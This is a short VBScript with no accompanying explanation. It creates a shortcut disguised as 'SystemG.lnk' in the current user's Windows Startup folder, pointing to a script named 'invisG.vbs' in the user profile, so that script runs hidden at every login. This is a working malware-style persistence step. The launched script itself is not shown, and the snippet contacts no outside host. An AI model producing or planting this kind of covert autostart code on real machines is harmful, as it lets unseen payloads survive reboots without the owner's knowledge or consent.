Set obj = CreateObject("wscript.shell")
userProfile = obj.ExpandEnvironmentStrings( "%userprofile%" )
Set nLink = obj.CreateShortcut(userProfile & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemG.lnk")

nLink.TargetPath = "%userprofile%\invisG.vbs"
nLink.Save